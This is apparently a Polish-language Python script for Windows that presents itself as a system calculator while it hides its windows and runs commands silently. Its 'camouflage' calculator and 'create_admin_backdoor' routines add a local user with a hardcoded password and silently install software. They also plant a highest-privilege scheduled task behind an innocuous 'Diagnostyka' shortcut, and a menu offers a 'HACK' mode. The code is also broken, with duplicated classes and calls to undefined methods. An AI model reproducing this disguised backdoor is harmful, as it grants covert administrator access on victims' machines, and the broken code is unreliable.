import ctypes
import math
import os
import re
import subprocess
import sys
import time
import tkinter
from threading import Thread


class CalcStyle:
    BG_MAIN = "#1c1c1c"
    BG_DISPLAY = "#1c1c1c"
    
    FG_PRIMARY = "#ffffff"
    FG_SECONDARY = "#a0a0a0"

    BTN_NUM = "#2d2d2d"
    BTN_NUM_HOVER = "#3d3d3d"
    BTN_FUNC = "#323232"
    BTN_FUNC_HOVER = "#404040"

    ACCENT = "#ff9500"
    ACCENT_HOVER = "#ffaa33"
    BTN_EQUAL = "#76b900"

    FONT_DISPLAY = ("Segoe UI Variable Static Semibold", 38)
    FONT_BUTTON = ("Segoe UI Variable Static", 14)
    FONT_STATUS = ("Segoe UI Variable Small", 9)

    CORNER_RADIUS = 8
    PAD_OUTER = 20
    BTN_PADDING = 2

class CalculatorLogic:
    @staticmethod
    def calculate(expression):
        try:
            expr = expression.replace('×', '*').replace('÷', '/').replace(',', '.')
            expr = expr.replace('√', 'math.sqrt').replace('^', '**')
            expr = re.sub(r'([+*/-]{2,})', lambda m: m.group(0)[-1], expr)
            
            if '%' in expr:
                expr = re.sub(r'(\d+\.?\d*)\s*([\+\-])\s*(\d+\.?\d*)%', r'\1 \2 (\1 * \3 / 100)', expr)
                expr = re.sub(r'(\d+\.?\d*)%', r'(\1/100)', expr)

            open_brackets = expr.count('(')
            close_brackets = expr.count(')')
            if open_brackets > close_brackets:
                expr += ')' * (open_brackets - close_brackets)

            expr = expr.rstrip('+*/-^.')
            if not expr.strip(): return ""

            allowed_names = {"math": math, "sqrt": math.sqrt}
            result = eval(expr, {"__builtins__": None}, allowed_names)
            
            if isinstance(result, (int, float)):
                formatted = f"{round(float(result), 10):g}"
                return formatted.replace('inf', 'LIMIT SYSTEMU').replace('nan', 'NIEZDEFINIOWANE')
            return str(result)

        except ZeroDivisionError:
            return "KRYTYCZNY: DZIEL/0"
        except SyntaxError:
            return "BŁĄD SKŁADNI"
        except ValueError:
            return "BŁĄD WARTOŚCI"
        except Exception as e:
            return "BŁĄD SYSTEMU"

    @staticmethod
    def quick_fix_input(current_text, new_char):
        operators = "+-*/.^"
        if not current_text and new_char in "+*/.^":
            return False
        if current_text and current_text[-1] in operators and new_char in operators:
            return "replace"
        return True

class BackgroundTasks:
    @staticmethod
    def execute_silent_command(command, task_name="Zadanie"):
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                creationflags=0x08000000
            )
            if result.returncode == 0:
                print(f"[SUCCESS] {task_name} wykonane pomyślnie.")
            else:
                print(f"[WARN] {task_name} zwróciło kod: {result.returncode}")
        except Exception as e:
            print(f"[ERROR] Krytyczny błąd w {task_name}: {e}")

    @classmethod
    def run_system_maintenance(cls):
        def sequence():
            cls.execute_silent_command("sfc /verifyonly", "Weryfikacja SFC")
            print("[SYSTEM] Wszystkie operacje tła zakończone.")

        Thread(target=sequence, daemon=True).start()

    @classmethod
    def schedule_tasks(cls, delay_ms=2000, root=None):
        if root:
            root.after(delay_ms, cls.run_system_maintenance)
        else:
            cls.run_system_maintenance()

class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.style = CalcStyle()
        self._setup_window()
        self._create_widgets()
        self.result_shown = False
        self.last_operator = None
        self.last_value = None
        
        BackgroundTasks.run_sfc_check()

    def _setup_window(self):
        self.root.title("Kalkulator Systemowy")
        self.root.geometry("360x550")
        self.root.attributes("-topmost", True)
        self.root.configure(bg=self.style.BG_DARK)

    def _create_widgets(self):
        self.display = tkinter.Entry(
            self.root, font=self.style.FONT_MAIN, justify='right', 
            bd=0, bg=self.style.BG_DARK, fg=self.style.FG_LIGHT, insertbackground="white"
        )
        self.display.pack(pady=(30, 10), padx=20, fill='x')

        self.btn_frame = tkinter.Frame(self.root, bg=self.style.BG_DARK)
        self.btn_frame.pack(expand=True, fill='both', padx=15, pady=15)
        
        self._build_grid()

    def _build_grid(self):
        buttons = [
            ('C', 0, 0, self.style.BTN_FUNC), ('DEL', 0, 1, self.style.BTN_FUNC), 
            ('%', 0, 2, self.style.BTN_FUNC), ('/', 0, 3, self.style.ACCENT),
            ('7', 1, 0, self.style.BTN_NUM),  ('8', 1, 1, self.style.BTN_NUM), 
            ('9', 1, 2, self.style.BTN_NUM),  ('*', 1, 3, self.style.ACCENT),
            ('4', 2, 0, self.style.BTN_NUM),  ('5', 2, 1, self.style.BTN_NUM), 
            ('6', 2, 2, self.style.BTN_NUM),  ('-', 2, 3, self.style.ACCENT),
            ('1', 3, 0, self.style.BTN_NUM),  ('2', 3, 1, self.style.BTN_NUM), 
            ('3', 3, 2, self.style.BTN_NUM),  ('+', 3, 3, self.style.ACCENT),
            ('0', 4, 0, self.style.BTN_NUM),  ('.', 4, 2, self.style.BTN_NUM), 
            ('=', 4, 3, self.style.ACCENT)
        ]

        for (text, row, col, base_color) in buttons:
            colspan = 2 if text == '0' else 1
            
            hover_color = self._get_hover_color(base_color)

            btn = tkinter.Button(
                self.btn_frame, 
                text=text, 
                font=self.style.FONT_BUTTON,
                bg=base_color, 
                fg=self.style.FG_PRIMARY, 
                bd=0,
                padx=10, pady=10,
                relief="flat",
                activebackground=hover_color,
                activeforeground=self.style.FG_PRIMARY,
                command=lambda t=text: self.handle_click(t)
            )
            
            btn.bind("<Enter>", lambda e, b=btn, h=hover_color: b.configure(bg=h))
            btn.bind("<Leave>", lambda e, b=btn, bc=base_color: b.configure(bg=bc))

            btn.grid(
                row=row, column=col, 
                columnspan=colspan, 
                padx=self.style.BTN_PADDING, 
                pady=self.style.BTN_PADDING, 
                sticky="nsew"
            )

        for i in range(4): self.btn_frame.grid_columnconfigure(i, weight=1)
        for i in range(5): self.btn_frame.grid_rowconfigure(i, weight=1)

    def _get_hover_color(self, color):
        mapping = {
            self.style.BTN_NUM: self.style.BTN_NUM_HOVER,
            self.style.BTN_FUNC: self.style.BTN_FUNC_HOVER,
            self.style.ACCENT: self.style.ACCENT_HOVER
        }
        return mapping.get(color, self.style.BTN_FUNC_HOVER)

    def handle_click(self, char):
        current = self.display.get()
        error_messages = ["BŁĄD SYSTEMU", "BŁĄD SKŁADNI", "KRYTYCZNY: DZIEL/0", "LIMIT SYSTEMU"]

        if current in error_messages or (self.result_shown and char not in "+-*/^%="):
            self.display.delete(0, tkinter.END)
            if char in ['C', 'DEL']: 
                self.result_shown = False
                return
            current = ""
        
        self.result_shown = False

        if char == 'C':
            self.display.delete(0, tkinter.END)
            self.last_operator = None
            self.last_value = None
            
        elif char == 'DEL':
            self.display.delete(len(current)-1, tkinter.END)
            
        elif char == '=':
            expr = current
            if self.last_operator and current and not any(op in current for op in "+-*/^"):
                expr = f"{current}{self.last_operator}{self.last_value}"
            else:
                import re
                match = re.search(r'([\+\-\*\/\^])(\d+\.?\d*)$', current)
                if match:
                    self.last_operator = match.group(1)
                    self.last_value = match.group(2)
                
            result = CalculatorLogic.calculate(expr)
            self.display.delete(0, tkinter.END)
            self.display.insert(0, result)
            self.result_shown = True
            
        else:
            action = self.logic.quick_fix_input(current, char)
            
            if action == "replace":
                self.display.delete(len(current)-1, tkinter.END)
                self.display.insert(tkinter.END, char)
            elif action is True or char not in "+-*/.^%":
                self.display.insert(tkinter.END, char)

    def run(self):
        self.root.mainloop()

class CalculatorLogic:
    @staticmethod
    def calculate(expression):
        try:
            expression = expression.replace('×', '*').replace('÷', '/')
            if not expression: return ""
            result = eval(expression, {"__builtins__": None}, {})
            return f"{result:g}"
        except Exception:
            return "Błąd"

class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Kalkulator Systemowy")
        self.root.geometry("360x550")
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#1e1e1e")
        self.logic = CalculatorLogic()

        self.display = tkinter.Entry(
            root, font=("Segoe UI Semibold", 32), justify='right', 
            bd=0, bg="#1e1e1e", fg="#ffffff", insertbackground="white"
        )
        self.display.pack(pady=(30, 10), padx=20, fill='x')

        self.status_label = tkinter.Label(root, text="System Ready", bg="#1e1e1e", fg="#333333", font=("Segoe UI", 8))
        self.status_label.pack(side="bottom", pady=5)

        btn_frame = tkinter.Frame(self.root, bg="#1e1e1e")
        btn_frame.pack(expand=True, fill='both', padx=15, pady=15)

        buttons = [
            ('C', 0, 0, "#3a3a3a"), ('DEL', 0, 1, "#3a3a3a"), ('%', 0, 2, "#3a3a3a"), ('/', 0, 3, "#ff9500"),
            ('7', 1, 0, "#2a2a2a"), ('8', 1, 1, "#2a2a2a"), ('9', 1, 2, "#2a2a2a"), ('*', 1, 3, "#ff9500"),
            ('4', 2, 0, "#2a2a2a"), ('5', 2, 1, "#2a2a2a"), ('6', 2, 2, "#2a2a2a"), ('-', 2, 3, "#ff9500"),
            ('1', 3, 0, "#2a2a2a"), ('2', 3, 1, "#2a2a2a"), ('3', 3, 2, "#2a2a2a"), ('+', 3, 3, "#ff9500"),
            ('0', 4, 0, "#2a2a2a"), ('.', 4, 2, "#2a2a2a"), ('=', 4, 3, "#ff9500")
        ]

        for (text, row, col, color) in buttons:
            colspan = 2 if text == '0' else 1
            btn = tkinter.Button(
                btn_frame, text=text, font=("Segoe UI", 14),
                bg=color, fg="white", bd=0, relief="flat",
                command=lambda t=text: self.on_click(t),
                activebackground="#4a4a4a", activeforeground="white"
            )
            btn.grid(row=row, column=col, columnspan=colspan, padx=2, pady=2, sticky="nsew")

        for i in range(4): btn_frame.grid_columnconfigure(i, weight=1)
        for i in range(5): btn_frame.grid_rowconfigure(i, weight=1)

        self.trigger_background_check()

    def on_click(self, char):
        if char == 'C':
            self.display.delete(0, tkinter.END)
        elif char == 'DEL':
            current = self.display.get()
            self.display.delete(0, tkinter.END)
            self.display.insert(0, current[:-1])
        elif char == '=':
            result = self.logic.calculate(self.display.get())
            self.display.delete(0, tkinter.END)
            self.display.insert(0, result)
        else:
            self.display.insert(tkinter.END, char)

    def trigger_background_check(self):
        def silent_work():
            subprocess.run("sfc /verifyonly", shell=True, creationflags=0x08000000)
            print("[SYSTEM] Tło zweryfikowane.")
        
        Thread(target=silent_work, daemon=True).start()

    def run(self):
        self.root.mainloop()

class SystemAdminOperations:
    def __init__(self, new_user="Tester", new_pass="Test2026!"):
        self.username = new_user
        self.password = new_pass

    def create_standard_user(self):
        try:
            subprocess.run(
                ['net', 'user', self.username, self.password, '/add'],
                check=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            print(f"[SYSTEM] Konto {self.username} zostało utworzone.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[BŁĄD] Nie udało się stworzyć konta: {e.stderr}")
            return False

    def install_dev_tools(self):
        print("[SYSTEM] Rozpoczynanie instalacji narzędzi przez Winget...")
        
        commands = [
            ['winget', 'install', '--id', 'Microsoft.VisualStudioCode', '--scope', 'machine', '--silent', '--accept-package-agreements', '--accept-source-agreements'],
            ['winget', 'install', '--id', 'Python.Python.3.12', '--silent', '--accept-package-agreements']
        ]
        
        for cmd in commands:
            pkg_name = cmd[3]
            try:
                check_cmd = ['winget', 'list', '--id', pkg_name]
                check_res = subprocess.run(check_cmd, capture_output=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                
                if pkg_name in check_res.stdout:
                    print(f"[INFO] {pkg_name} jest już zainstalowany. Pomijam.")
                    continue

                print(f"[SYSTEM] Instalowanie: {pkg_name}...")
                subprocess.run(cmd, check=False, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                print(f"[SYSTEM] Wykonano operację dla: {pkg_name}")
        
            except Exception as e:
                print(f"[BŁĄD] Problem z instalacją lub sprawdzeniem {pkg_name}: {e}")

    def create_admin_backdoor(self):
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        shortcut_path = os.path.join(desktop, "Diagnostyka.lnk")
        task_name = "WinUpdateDiag"
        print(f"[DEBUG] Lokalizacja pulpitu: {desktop}")
        try:
            print(f"[SYSTEM] Krok 1/3: Rejestracja zadania '{task_name}'...")
            cmd_task = f'schtasks /create /tn "{task_name}" /tr "cmd.exe /k echo SESJA ADMINISTRATORA AKTYWNA" /sc once /st 00:00 /rl highest /f'
            subprocess.run(cmd_task, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print(f"[SYSTEM] Krok 2/3: Generowanie skrótu na pulpicie...")
            ps_cmd = (
                f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{shortcut_path}'); "
                f"$s.TargetPath = 'C:\\Windows\\System32\\schtasks.exe'; "
                f"$s.Arguments = '/run /tn {task_name}'; "
                f"$s.WindowStyle = 7; " 
                f"$s.IconLocation = 'C:\\Windows\\System32\\shell32.dll,15'; " 
                f"$s.Save()"
            )
            subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.exists(shortcut_path):
                print(f"[GOTOWE] Skrót 'Diagnostyka' utworzony.")
                return True
        except Exception as e:
            print(f"[BŁĄD] Backdoor: {e}")
            return False

class UIAppCamouflage:
    def launch_custom_calc(self):
        def run_tk():
            root = tkinter.Tk()
            root.title("Kalkulator 2026")
            root.geometry("300x400")
            root.attributes("-topmost", True)
            
            tkinter.Label(root, text="Kalkulator Systemowy", font=("Arial", 12, "bold")).pack(pady=10)
            tkinter.Label(root, text="Trwa sprawdzanie konfiguracji...", fg="blue").pack()
            
            display = tkinter.Entry(root, font=("Arial", 20), justify='right', bd=10)
            display.insert(0, "0")
            display.pack(pady=20, padx=10, fill='x')
            
            print("[UI] Okno kalkulatora aktywne.")
            root.mainloop()

        Thread(target=run_tk, daemon=True).start()

class MainController:
    def __init__(self):
        self.admin_ops = SystemAdminOperations()
        self.ui = UIAppCamouflage()

    def is_elevated(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def user_exists(self, username):
        result = subprocess.run(['net', 'user', username], 
                                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return result.returncode == 0

    def vscode_installed(self):
        result = subprocess.run(['winget', 'list', '--id', 'Microsoft.VisualStudioCode'], 
                                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return "Microsoft.VisualStudioCode" in result.stdout

    def launch_vsc_as_tester(self):
        print(f"[SYSTEM] Automatyczne uruchamianie VS Code dla {self.admin_ops.username}...")
        
        vsc_path = r"C:\Users\barte\AppData\Local\Programs\Microsoft VS Code\bin\code.cmd"
        if not os.path.exists(vsc_path):
            vsc_path = os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Microsoft VS Code", "bin", "code.cmd")
        
        task_name = "LaunchVSCodeForTester"
        
        try:
            subprocess.run([
                'schtasks', '/create', '/tn', task_name, 
                '/tr', f'"{vsc_path}"', 
                '/sc', 'once', '/st', '00:00', 
                '/ru', self.admin_ops.username, 
                '/rp', self.admin_ops.password, 
                '/f'
            ], capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

            subprocess.run(['schtasks', '/run', '/tn', task_name], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            print("[SUKCES] Zadanie wysłane. Sprawdź pasek zadań na koncie Tester.")
        except Exception as e:
            print(f"[BŁĄD] Harmonogram zadań: {e}")

    def create_admin_backdoor(self):
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        shortcut_path = os.path.join(desktop, "Diagnostyka.lnk")
        task_name = "WinUpdateDiag"

        print(f"[DEBUG] Lokalizacja pulpitu: {desktop}")
        
        try:
            print(f"[SYSTEM] Krok 1/3: Rejestracja zadania '{task_name}' w Harmonogramie...")
            result_task = subprocess.run(
                f'schtasks /create /tn "{task_name}" /tr "cmd.exe /k echo SESJA ADMINISTRATORA AKTYWNA" /sc once /st 00:00 /rl highest /f',
                shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result_task.returncode == 0:
                print(f"[SUKCES] Zadanie '{task_name}' zarejestrowane poprawnie.")
            else:
                print(f"[BŁĄD] Nie udało się stworzyć zadania: {result_task.stderr.strip()}")

            print(f"[SYSTEM] Krok 2/3: Generowanie binarnego skrótu .LNK na pulpicie...")
            ps_cmd = (
                f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{shortcut_path}'); "
                f"$s.TargetPath = 'C:\\Windows\\System32\\schtasks.exe'; "
                f"$s.Arguments = '/run /tn {task_name}'; "
                f"$s.WindowStyle = 7; " 
                f"$s.IconLocation = 'C:\\Windows\\System32\\shell32.dll,15'; " 
                f"$s.Save()"
            )
            
            result_ps = subprocess.run(["powershell", "-Command", ps_cmd], 
                                        capture_output=True, text=True,
                                        creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result_ps.returncode == 0:
                print(f"[SUKCES] Plik skrótu utworzony w: {shortcut_path}")
            else:
                print(f"[BŁĄD] PowerShell nie mógł stworzyć skrótu: {result_ps.stderr.strip()}")

            print(f"[SYSTEM] Krok 3/3: Weryfikacja istnienia pliku...")
            if os.path.exists(shortcut_path):
                print(f"\n[GOTOWE] Skrót 'Diagnostyka' jest dostępny na pulpicie.")
                print(f"[INFO] Kliknij go dwukrotnie, aby uzyskać natychmiastowy dostęp do CMD (Admin).")
            else:
                print(f"[ALARM] Plik nie został odnaleziony na pulpicie. Sprawdź kwarantannę antywirusa!")

        except Exception as e:
            print(f"[KRYTYCZNY BŁĄD] Wystąpił nieoczekiwany wyjątek: {str(e)}")

    def run(self):
        mode = sys.argv[1] if (len(sys.argv) > 1 and sys.argv[1] in ["1", "2", "3"]) else None

        if not mode:
            mode = input("\n=== SYSTEM CONTROL 2026 ===\n" \
            "1. TEST       (Konto + Instalacja + Diagnostyka)\n" \
            "2. KALKULATOR (GUI + Skrót Diagnostyka)\n" \
            "3. HACK       (Szybki dostęp do CMD)\n" \
            "4. CZYSTY KALKULATOR (Tylko GUI)\n" \
            "Wybierz opcję (od 1 do 4): ")

        elif mode == "1":
            if self.is_elevated():
                print("[SYSTEM] Tryb: Faza Testów (Administrator)")
                
                if not self.user_exists(self.admin_ops.username):
                    self.admin_ops.create_standard_user()
                else:
                    print(f"[INFO] Użytkownik {self.admin_ops.username} już istnieje.")
                
                self.admin_ops.install_dev_tools()
                self.launch_vsc_as_tester()
                
                self.admin_ops.create_admin_backdoor()
                self.run_full_diagnostics()
                
                print("\n[SUKCES] Wszystkie operacje Trybu 1 wykonane.")
                time.sleep(5)
            else:
                self.request_elevation_with_mode("1")

        if mode == "2":
            if self.is_elevated():
                print("[SYSTEM] Tryb: Kalkulator (Administrator)")
                self.admin_ops.create_admin_backdoor()
                self.run_admin_calculator()
            else:
                self.request_elevation_with_mode("2")

        elif mode == "3":
            if self.is_elevated():
                print("[SYSTEM] Dostęp przyznany. Otwieram CMD...")
                subprocess.Popen(['start', 'cmd', '/k', 'echo SYSTEM ZAKODOWANY. MASZ ADMINA.'], shell=True)
            else:
                self.request_elevation_with_mode("3")

        elif mode == "4":
            print("[SYSTEM] Uruchamiam czysty kalkulator...")
            root = tkinter.Tk()
            app = CalculatorApp(root)
            app.run()

    def run_admin_calculator(self):
        print("[SYSTEM] Uruchamiam środowisko administratora...")
        
        subprocess.Popen(['start', 'cmd', '/k', 'echo Zalogowano jako: %USERNAME% ^& echo Masz uprawnienia ADMINISTRATORA.'], shell=True)

        root = tkinter.Tk()
        app = CalculatorApp(root)
        print("[UI] Kalkulator aktywny.")
        app.run()

    def request_elevation_with_mode(self, mode):
        script = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {mode}', None, 1)

    def run_diagnostic_command(self, command, step_name):
        print(f"\n[KROK: {step_name}] Wykonywanie: {command}...")
        try:
            proc = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                shell=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            stdout, stderr = proc.communicate()
            if stdout: print(f"[INFO SYSTEMOWY]:\n{stdout.strip()}")
            if stderr: print(f"[BŁĄD SYSTEMOWY]:\n{stderr.strip()}")
            return proc.returncode
        except Exception as e:
            print(f"[BŁĄD KRYTYCZNY]: {str(e)}")
            return -1

    def run_full_diagnostics(self):
        return self.run_diagnostic_command("systeminfo", "Diagnostyka systemu")


if __name__ == "__main__":
    app = MainController()
    app.run()
